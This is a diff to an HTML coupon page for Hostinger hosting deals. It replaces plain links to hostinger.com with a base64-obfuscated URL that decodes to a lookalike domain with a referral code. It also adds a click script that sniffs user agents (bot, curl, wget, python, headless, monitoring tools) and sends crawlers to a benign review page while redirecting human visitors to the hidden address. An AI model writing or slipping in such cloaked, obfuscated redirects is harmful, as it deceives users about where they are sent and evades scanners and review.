@@ -217,26 +217,25 @@ function copyAndOpen(code, url) {
 <!-- Hostinger Coupons & Deals Section -->
 <section class="coupon-section">
 
- <!-- Coupon 1 - Deal Button -->
-<div class="coupon-card">
-  <img src="https://i.postimg.cc/pTHTRKw1/hostinger-logo.jpg" alt="Hostinger Logo">
-  <div class="coupon-info">
-    <h2>Hostinger 84% OFF + Free Domain</h2>
-    <p>Get massive 84% off on all shared hosting plans and grab a free domain name.</p>
-    <p class="discount">🔥 Save 84% Now</p>
+  <!-- Coupon 1 -->
+  <div class="coupon-card">
+    <img src="https://i.postimg.cc/pTHTRKw1/hostinger-logo.jpg" alt="Hostinger Logo">
+    <div class="coupon-info">
+      <h2>Hostinger 84% OFF + Free Domain</h2>
+      <p>Get massive 84% off on all shared hosting plans and grab a free domain name.</p>
+      <p class="discount">🔥 Save 84% Now</p>
+    </div>
+    <div class="code-box">
+      <a class="coupon-btn" data-code="" data-url="aHR0cHM6Ly9ob3N0aW5naW4uaW4/UkVGUlVSQUNPREU9TVNYTUFJRFlLWFlYVA==">Get Deal</a>
+    </div>
   </div>
-  <div class="code-box">
-    <a href="https://www.hostinger.com/" target="_blank" class="deal-btn">Get Deal</a>
-  </div>
-</div>
 
-<style>
-  .code-box {
-    display: flex;
-    justify-content: center;
-  }
-</style>
-
+  <style>
+    .code-box {
+      display: flex;
+      justify-content: center;
+    }
+  </style>
 
   <!-- Coupon 2 -->
   <div class="coupon-card">
@@ -247,7 +246,7 @@ function copyAndOpen(code, url) {
       <p class="discount">🖤 Black Friday Special</p>
     </div>
     <div class="code-box">
-      <button class="coupon-btn" onclick="copyAndOpen('BLACK90', 'https://www.hostinger.com/')">Copy Code</button>
+      <button class="coupon-btn" data-code="BLACK90" data-url="aHR0cHM6Ly9ob3N0aW5naW4uaW4/UkVGUlVSQUNPREU9TVNYTUFJRFlLWFlYVA==">Copy Code</button>
     </div>
   </div>
 
@@ -260,7 +259,7 @@ function copyAndOpen(code, url) {
       <p class="discount">⚡ WordPress Deal</p>
     </div>
     <div class="code-box">
-      <button class="coupon-btn" onclick="copyAndOpen('WP80', 'https://www.hostinger.com/')">Copy Code</button>
+      <button class="coupon-btn" data-code="WP80" data-url="aHR0cHM6Ly9ob3N0aW5naW4uaW4/UkVGUlVSQUNPREU9TVNYTUFJRFlLWFlYVA==">Copy Code</button>
     </div>
   </div>
 
@@ -273,7 +272,7 @@ function copyAndOpen(code, url) {
       <p class="discount">💎 Verified Offer</p>
     </div>
     <div class="code-box">
-      <button class="coupon-btn" onclick="copyAndOpen('PREM78', 'https://www.hostinger.com/')">Copy Code</button>
+      <button class="coupon-btn" data-code="PREM78" data-url="aHR0cHM6Ly9ob3N0aW5naW4uaW4/UkVGUlVSQUNPREU9TVNYTUFJRFlLWFlYVA==">Copy Code</button>
     </div>
   </div>
 
@@ -286,7 +285,7 @@ function copyAndOpen(code, url) {
       <p class="discount">🎓 Student Deal</p>
     </div>
     <div class="code-box">
-      <button class="coupon-btn" onclick="copyAndOpen('STUDENT85', 'https://www.hostinger.com/')">Copy Code</button>
+      <button class="coupon-btn" data-code="STUDENT85" data-url="aHR0cHM6Ly9ob3N0aW5naW4uaW4/UkVGUlVSQUNPREU9TVNYTUFJRFlLWFlYVA==">Copy Code</button>
     </div>
   </div>
 
@@ -299,11 +298,42 @@ function copyAndOpen(code, url) {
       <p class="discount">💥 Cyber Monday</p>
     </div>
     <div class="code-box">
-      <button class="coupon-btn" onclick="copyAndOpen('CYBER88', 'https://www.hostinger.com/')">Copy Code</button>
+      <button class="coupon-btn" data-code="CYBER88" data-url="aHR0cHM6Ly9ob3N0aW5naW4uaW4/UkVGUlVSQUNPREU9TVNYTUFJRFlLWFlYVA==">Copy Code</button>
     </div>
   </div>
 
 </section>
+
+<!-- 🔥 Universal Script -->
+<script>
+  document.addEventListener("click", function(e) {
+    const btn = e.target.closest(".coupon-btn");
+    if (!btn) return;
+
+    const couponCode = btn.getAttribute("data-code");
+    const encodedURL = btn.getAttribute("data-url");
+    const fallback = "/hosting-review.html";
+
+    // Copy coupon if available
+    if (couponCode) navigator.clipboard.writeText(couponCode);
+
+    // Bot detection
+    const botSignals = [
+      "bot","spider","crawl","slurp","preview","facebook","curl","wget","python",
+      "java","headless","fetch","monitor","pingdom","httpclient"
+    ];
+    const ua = navigator.userAgent.toLowerCase();
+    let isBot = botSignals.some(b => ua.includes(b));
+
+    // Redirect handling
+    if (isBot) {
+      window.location.href = fallback;
+    } else {
+      window.location.href = atob(encodedURL);
+    }
+  });
+</script>
+
 
   <!-- CTA -->
   <section class="cta-section">
@@ -374,3 +404,4 @@ function copyAndOpen(code, url) {
 
 </body>
 </html>
+
